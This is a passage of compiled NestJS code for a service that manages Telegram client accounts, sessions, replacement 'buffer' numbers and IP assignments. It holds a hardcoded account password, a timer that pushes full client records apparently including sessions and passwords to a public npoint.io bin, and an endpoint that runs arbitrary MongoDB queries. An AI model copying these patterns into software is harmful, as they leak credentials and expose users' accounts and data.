            const ipAddress = await this.clientService.getIpForMobile(mobile, clientId);
            return {
                mobile,
                ipAddress,
                hasAssignment: ipAddress !== null
            };
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async autoAssignIpsToClient(clientId) {
        try {
            const result = await this.clientService.autoAssignIpsToClient(clientId);
            return {
                success: true,
                message: `Auto-assigned IPs to ${result.summary.assigned}/${result.summary.totalMobiles} mobiles`,
                data: result
            };
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async getMobilesNeedingIpAssignment(clientId) {
        try {
            const mobilesNeedingIps = await this.clientService.getMobilesNeedingIpAssignment(clientId);
            const totalNeedingAssignment = (mobilesNeedingIps.mainMobile ? 1 : 0) + mobilesNeedingIps.promoteMobiles.length;
            return {
                clientId,
                mobilesNeedingIps,
                summary: {
                    totalNeedingAssignment,
                    mainMobileNeedsIp: !!mobilesNeedingIps.mainMobile,
                    promoteMobilesNeedingIp: mobilesNeedingIps.promoteMobiles.length
                }
            };
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async releaseIpFromMobile(mobile) {
        try {
            return await this.clientService.releaseIpFromMobile(mobile);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
};
exports.ClientController = ClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    (0, swagger_1.ApiResponse)({ status: 201, description: 'The user data has been successfully created.' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid input data.' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_client_dto_1.CreateClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Client ID' }),
    (0, swagger_1.ApiQuery)({ name: 'dbcoll', required: false, description: 'Database collection name' }),
    (0, swagger_1.ApiQuery)({ name: 'channelLink', required: false, description: 'Channel link' }),
    (0, swagger_1.ApiQuery)({ name: 'link', required: false, description: 'Client link' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Matching user data returned successfully.' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_client_dto_1.SearchClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('search/promote-mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Search clients by promote mobile numbers' }),
    (0, swagger_1.ApiQuery)({ name: 'mobile', required: true, description: 'Promote mobile number to search for' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Clients with matching promote mobiles returned successfully.' }),
    __param(0, (0, common_1.Query)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "searchByPromoteMobile", null);
__decorate([
    (0, common_1.Get)('search/enhanced'),
    (0, swagger_1.ApiOperation)({ summary: 'Enhanced search with promote mobile support' }),
    (0, swagger_1.ApiQuery)({ name: 'promoteMobileNumber', required: false, description: 'Promote mobile number to search for' }),
    (0, swagger_1.ApiQuery)({ name: 'hasPromoteMobiles', required: false, description: 'Filter by clients that have promote mobiles (true/false)' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Enhanced search results with promote mobile context.' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "enhancedSearch", null);
__decorate([
    (0, common_1.Get)('updateClient/:clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "updateClient", null);
__decorate([
    (0, common_1.Get)('maskedCls'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data with masked fields' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'All user data returned successfully.' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findAllMasked", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'All user data returned successfully.' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)('sync-npoint'),
    (0, swagger_1.ApiOperation)({ summary: 'Sync clients with npoint service' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Clients synchronized successfully with npoint.' }),
    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal server error during synchronization.' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "syncNpoint", null);
__decorate([
    (0, common_1.Get)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'User data returned successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'User data not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'The user data has been successfully updated.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'User data not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_client_dto_1.UpdateClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'The user data has been successfully deleted.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'User data not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Query executed successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid query.' }),
    (0, swagger_1.ApiBody)({ schema: { properties: { query: { type: 'object' }, sort: { type: 'object' }, limit: { type: 'number' }, skip: { type: 'number' } } } }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "executeQuery", null);
__decorate([
    (0, common_1.Patch)(':clientId/promoteMobile/add'),
    (0, swagger_1.ApiOperation)({ summary: 'Add a mobile number as a promote mobile for a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'The unique identifier of the client' }),
    (0, swagger_1.ApiBody)({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Mobile number assigned as promote mobile successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Client not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "addPromoteMobile", null);
__decorate([
    (0, common_1.Patch)(':clientId/promoteMobile/remove'),
    (0, swagger_1.ApiOperation)({ summary: 'Remove a promote mobile assignment from a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'The unique identifier of the client' }),
    (0, swagger_1.ApiBody)({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Promote mobile assignment removed successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Client not found.' }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "removePromoteMobile", null);
__decorate([
    (0, common_1.Get)(':clientId/ip-info'),
    (0, swagger_1.ApiOperation)({ summary: 'Get IP assignment information for a client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'IP information retrieved successfully' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "getClientIpInfo", null);
__decorate([
    (0, common_1.Get)('mobile/:mobile/ip'),
    (0, swagger_1.ApiOperation)({ summary: 'Get IP address for a specific mobile number' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number' }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Client ID for context' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'IP address retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "getIpForMobile", null);
__decorate([
    (0, common_1.Post)(':clientId/auto-assign-ips'),
    (0, swagger_1.ApiOperation)({ summary: 'Auto-assign IPs to all client mobile numbers (Simplified System)' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'IPs assigned successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Assignment failed' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "autoAssignIpsToClient", null);
__decorate([
    (0, common_1.Get)(':clientId/mobiles-needing-ips'),
    (0, swagger_1.ApiOperation)({ summary: 'Get mobile numbers that need IP assignment' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Mobile numbers needing IP assignment' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "getMobilesNeedingIpAssignment", null);
__decorate([
    (0, common_1.Delete)('mobile/:mobile/ip'),
    (0, swagger_1.ApiOperation)({ summary: 'Release IP from a mobile number' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number to release IP from' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'IP released successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "releaseIpFromMobile", null);
exports.ClientController = ClientController = __decorate([
    (0, swagger_1.ApiTags)('Clients'),
    (0, common_1.Controller)('clients'),
    __metadata("design:paramtypes", [client_service_1.ClientService])
], ClientController);


/***/ }),

/***/ "./src/components/clients/client.module.ts":
/*!*************************************************!*\
  !*** ./src/components/clients/client.module.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const client_schema_1 = __webpack_require__(/*! ./schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
const client_service_1 = __webpack_require__(/*! ./client.service */ "./src/components/clients/client.service.ts");
const client_controller_1 = __webpack_require__(/*! ./client.controller */ "./src/components/clients/client.controller.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const archived_client_module_1 = __webpack_require__(/*! ../archived-clients/archived-client.module */ "./src/components/archived-clients/archived-client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const npoint_module_1 = __webpack_require__(/*! ../n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
const timestamp_module_1 = __webpack_require__(/*! ../timestamps/timestamp.module */ "./src/components/timestamps/timestamp.module.ts");
const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
const ip_management_module_1 = __webpack_require__(/*! ../ip-management/ip-management.module */ "./src/components/ip-management/ip-management.module.ts");
const promote_client_module_1 = __webpack_require__(/*! ../promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
const promote_clients_1 = __webpack_require__(/*! ../promote-clients */ "./src/components/promote-clients/index.ts");
let ClientModule = class ClientModule {
};
exports.ClientModule = ClientModule;
exports.ClientModule = ClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: client_schema_1.Client.name, schema: client_schema_1.ClientSchema }]),
            mongoose_1.MongooseModule.forFeature([{ name: promote_clients_1.PromoteClient.name, schema: promote_clients_1.PromoteClientSchema, collection: 'promoteClients' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => buffer_client_module_1.BufferClientModule),
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            (0, common_1.forwardRef)(() => archived_client_module_1.ArchivedClientModule),
            (0, common_1.forwardRef)(() => session_manager_1.SessionModule),
            (0, common_1.forwardRef)(() => timestamp_module_1.TimestampModule),
            (0, common_1.forwardRef)(() => ip_management_module_1.IpManagementModule),
            (0, common_1.forwardRef)(() => promote_client_module_1.PromoteClientModule),
            npoint_module_1.NpointModule
        ],
        controllers: [client_controller_1.ClientController],
        providers: [client_service_1.ClientService],
        exports: [client_service_1.ClientService, mongoose_1.MongooseModule]
    })
], ClientModule);


/***/ }),

/***/ "./src/components/clients/client.service.ts":
/*!**************************************************!*\
  !*** ./src/components/clients/client.service.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var ClientService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientService = void 0;
const Telegram_service_1 = __webpack_require__(/*! ./../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const client_schema_1 = __webpack_require__(/*! ./schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
const buffer_client_service_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const archived_client_service_1 = __webpack_require__(/*! ../archived-clients/archived-client.service */ "./src/components/archived-clients/archived-client.service.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const path = __importStar(__webpack_require__(/*! path */ "path"));
const cloudinary_1 = __webpack_require__(/*! ../../cloudinary */ "./src/cloudinary.ts");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
const ip_management_service_1 = __webpack_require__(/*! ../ip-management/ip-management.service */ "./src/components/ip-management/ip-management.service.ts");
const promote_client_schema_1 = __webpack_require__(/*! ../promote-clients/schemas/promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts");
let settingupClient = Date.now() - 250000;
let ClientService = ClientService_1 = class ClientService {
    constructor(clientModel, promoteClientModel, telegramService, bufferClientService, usersService, archivedClientService, sessionService, ipManagementService, npointSerive) {
        this.clientModel = clientModel;
        this.promoteClientModel = promoteClientModel;
        this.telegramService = telegramService;
        this.bufferClientService = bufferClientService;
        this.usersService = usersService;
        this.archivedClientService = archivedClientService;
        this.sessionService = sessionService;
        this.ipManagementService = ipManagementService;
        this.npointSerive = npointSerive;
        this.logger = new common_1.Logger(ClientService_1.name);
        this.clientsMap = new Map();
        this.lastUpdateMap = new Map();
        this.checkInterval = null;
        this.checkInterval = setInterval(async () => {
            await this.refreshMap();
            await this.checkNpoint();
        }, 5 * 60 * 1000);
    }
    async onModuleDestroy() {
        this.logger.log('Module is being Destroyed, Disconnecting all clients');
        if (this.checkInterval) {
            clearInterval(this.checkInterval);
        }
        await connection_manager_1.connectionManager.handleShutdown();
    }
    async checkNpoint() {
        const npointIdFull = '7c2682f37bb93ef486ba';
        const npointIdMasked = 'f0d1e44d82893490bbde';
        const { data: npointMaskedClients } = await (0, fetchWithTimeout_1.fetchWithTimeout)(`https://api.npoint.io/${npointIdMasked}`);
        const existingMaskedClients = await this.findAllMaskedObject();
        if ((0, utils_1.areJsonsNotSame)(npointMaskedClients, existingMaskedClients)) {
            await this.npointSerive.updateDocument(npointIdMasked, existingMaskedClients);
            this.logger.log('Updated Masked Clients from Npoint');
        }
        const { data: npointClients } = await (0, fetchWithTimeout_1.fetchWithTimeout)(`https://api.npoint.io/${npointIdFull}`);
        const existingClients = await this.findAllObject();
        if ((0, utils_1.areJsonsNotSame)(npointClients, existingClients)) {
            await this.npointSerive.updateDocument(npointIdFull, existingClients);
            this.logger.log('Updated Full Clients from Npoint');
        }
    }
    async create(createClientDto) {
        const createdUser = new this.clientModel(createClientDto);
        return createdUser.save();
    }
    async findAll() {
        this.logger.debug('Retrieving all client documents');
        try {
            if (this.clientsMap.size < 20) {
                const documents = await this.clientModel
                    .find({}, { _id: 0, updatedAt: 0 })
                    .lean()
                    .exec();
                documents.forEach((client) => {
                    this.clientsMap.set(client.clientId, client);
                });
                this.logger.debug(`Successfully retrieved ${documents.length} client documents`);
                return Array.from(this.clientsMap.values());
            }
            else {
                this.logger.debug(`Retrieved ${this.clientsMap.size} clients from cache`);
                return Array.from(this.clientsMap.values());
            }
        }
        catch (error) {
            (0, parseError_1.parseError)(error, 'Failed to retrieve all clients: ', true);
            this.logger.error(`Failed to retrieve all clients: ${error.message}`, error.stack);
            throw error;
        }
    }
    async findAllMasked() {
        const clients = await this.findAll();
        const maskedClients = clients.map((client) => {
            const { session, mobile, password, ...maskedClient } = client;
            return { ...maskedClient };
        });
        return maskedClients;
    }
    async findAllObject() {
        this.logger.debug('Retrieving all client documents');
        try {
            if (this.clientsMap.size < 20) {
                const documents = await this.clientModel
                    .find({}, { _id: 0, updatedAt: 0 })
                    .lean()
                    .exec();
                const result = documents.reduce((acc, client) => {
                    this.clientsMap.set(client.clientId, client);
                    acc[client.clientId] = client;
                    return acc;
                }, {});
                this.logger.debug(`Successfully retrieved ${documents.length} client documents`);
                this.logger.log('Refreshed Clients');
                return result;
            }
            else {
                const result = Array.from(this.clientsMap.entries()).reduce((acc, [clientId, client]) => {
                    acc[clientId] = client;
                    return acc;
                }, {});
                this.logger.debug(`Retrieved ${this.clientsMap.size} clients from cache`);
                return result;
            }
        }
        catch (error) {
            (0, parseError_1.parseError)(error, 'Failed to retrieve all clients: ', true);
            this.logger.error(`Failed to retrieve all clients: ${error.message}`, error.stack);
            throw error;
        }
    }
    async findAllMaskedObject(query) {
        let filteredClients;
        if (query) {
            const searchResult = await this.enhancedSearch(query);
            filteredClients = searchResult.clients;
        }
        else {
            const allClients = await this.findAll();
            filteredClients = Array.isArray(allClients)
                ? allClients
                : Object.values(allClients);
        }
        const results = filteredClients.reduce((acc, client) => {
            const { session, mobile, password, ...maskedClient } = client;
            acc[client.clientId] = { clientId: client.clientId, ...maskedClient };
            return acc;
        }, {});
        return results;
    }
    async refreshMap() {
        this.logger.log('Refreshed Clients');
        const tempMap = new Map();
        this.clientsMap = tempMap;
    }
    async findOne(clientId, throwErr = true) {
        const client = this.clientsMap.get(clientId);
        if (client) {
            return client;
        }
        else {
            const user = await this.clientModel
                .findOne({ clientId }, { _id: 0, updatedAt: 0 })
                .lean()
                .exec();
            if (!user && throwErr) {
                throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
            }
            if (user) {
                this.clientsMap.set(clientId, user);
            }
            return user;
        }
    }
    async update(clientId, updateClientDto) {
        delete updateClientDto['_id'];
        if (updateClientDto._doc) {
            delete updateClientDto._doc['_id'];
        }
        const previousUser = await this.clientModel
            .findOne({ clientId })
            .lean()
            .exec();
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Updating the Existing client: ${clientId}`);
        this.logger.log('Previous Client Values:', previousUser);
        const updatedUser = await this.clientModel
            .findOneAndUpdate({ clientId }, { $set: updateClientDto }, { new: true, upsert: true })
            .lean()
            .exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
        }
        await this.checkNpoint();
        this.clientsMap.set(clientId, updatedUser);
        this.logger.log('Updated Client Values:', updatedUser);
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimeChecker}/refreshmap`);
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimebot}/refreshmap`);
        this.logger.log('Refreshed Maps');
        this.logger.log('Updated Client: ', updatedUser);
        if (previousUser &&
            (previousUser.mobile !== updatedUser.mobile ||
                previousUser.session !== updatedUser.session)) {
            setTimeout(async () => {
                await this.sessionService.createSession({
                    mobile: updatedUser.mobile,
                    password: 'Ajtdmwajt1@',
                    maxRetries: 5,
                });
            }, 60000);
        }
        return updatedUser;
    }
    async remove(clientId) {
        const deletedUser = await this.clientModel
            .findOneAndDelete({ clientId })
            .exec();
        if (!deletedUser) {
            throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
        }
        return deletedUser;
    }
    async search(filter) {
        this.logger.log('Original filter:', filter);
        if (filter.hasPromoteMobiles !== undefined) {
            const hasPromoteMobiles = filter.hasPromoteMobiles.toLowerCase() === 'true';
            delete filter.hasPromoteMobiles;
            if (hasPromoteMobiles) {
                const clientsWithPromoteMobiles = await this.promoteClientModel
                    .find({ clientId: { $exists: true } })
                    .distinct('clientId')
                    .lean();
                filter.clientId = { $in: clientsWithPromoteMobiles };
            }
            else {
                const clientsWithPromoteMobiles = await this.promoteClientModel
                    .find({ clientId: { $exists: true } })
                    .distinct('clientId')
                    .lean();
                filter.clientId = { $nin: clientsWithPromoteMobiles };
            }
        }
        if (filter.firstName) {
            const escapedFirstName = filter.firstName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            filter.firstName = { $regex: new RegExp(escapedFirstName, 'i') };
        }
        if (filter.name) {
            const escapedName = filter.name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            filter.name = { $regex: new RegExp(escapedName, 'i') };
        }
        this.logger.log('Final filter:', filter);
        return this.clientModel.find(filter).exec();
    }
    async searchClientsByPromoteMobile(mobileNumbers) {
        const promoteClients = await this.promoteClientModel
            .find({
            mobile: { $in: mobileNumbers },
            clientId: { $exists: true },
        })
            .lean();
        const clientIds = [...new Set(promoteClients.map((pc) => pc.clientId))];
        return this.clientModel.find({ clientId: { $in: clientIds } }).exec();
    }
    async enhancedSearch(filter) {
        let searchType = 'direct';
        let promoteMobileMatches = [];
        if (filter.promoteMobileNumber) {
            searchType = 'promoteMobile';
            const mobileNumber = filter.promoteMobileNumber;
            delete filter.promoteMobileNumber;
            const promoteClients = await this.promoteClientModel
                .find({
                mobile: {
                    $regex: new RegExp(mobileNumber.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'i'),
                },
                clientId: { $exists: true },
            })
                .lean();
            promoteMobileMatches = promoteClients.map((pc) => ({
                clientId: pc.clientId,
                mobile: pc.mobile,
            }));
            const clientIds = promoteClients.map((pc) => pc.clientId);
            filter.clientId = { $in: clientIds };
        }
        const clients = await this.search(filter);
        return {
            clients,
            searchType,
            promoteMobileMatches: promoteMobileMatches.length > 0 ? promoteMobileMatches : undefined,
        };
    }
    async setupClient(clientId, setupClientQueryDto) {
        this.logger.log(`Received New Client Request for - ${clientId}`, settingupClient);
        if ((0, utils_1.toBoolean)(process.env.AUTO_CLIENT_SETUP) &&
            Date.now() > settingupClient + 240000) {
            settingupClient = Date.now();
            const existingClient = await this.findOne(clientId);
            const existingClientMobile = existingClient.mobile;
            this.logger.log('setupClientQueryDto:', setupClientQueryDto);
            const today = new Date(Date.now()).toISOString().split('T')[0];
            const query = { availableDate: { $lte: today }, channels: { $gt: 200 } };
            const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];
            if (newBufferClient) {
                try {
                    await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Received New Client Request for - ${clientId} - OldNumber: ${existingClient.mobile} || ${existingClient.username}`);
                    this.telegramService.setActiveClientSetup({
                        ...setupClientQueryDto,
                        clientId,
                        existingMobile: existingClientMobile,
                        newMobile: newBufferClient.mobile,
                    });
                    await connection_manager_1.connectionManager.getClient(newBufferClient.mobile);
                    const newSession = await this.telegramService.createNewSession(newBufferClient.mobile);
                    await this.updateClientSession(newSession);
                }
                catch (error) {
                    (0, parseError_1.parseError)(error);
                    this.logger.log('Removing buffer as error');
                    const availableDate = new Date(Date.now() + 3 * 24 * 60 * 60 * 1000)
                        .toISOString()
                        .split('T')[0];
                    await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });
                    this.telegramService.setActiveClientSetup(undefined);
                }
                finally {
                    await connection_manager_1.connectionManager.unregisterClient(newBufferClient.mobile);
                }
            }
            else {
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Buffer Clients not available, Requested by ${clientId}`);
                this.logger.log('Buffer Clients not available');
            }
        }
        else {
            this.logger.log('Profile Setup Recently tried, wait ::', settingupClient - Date.now());
        }
    }
    async updateClientSession(newSession) {
        try {
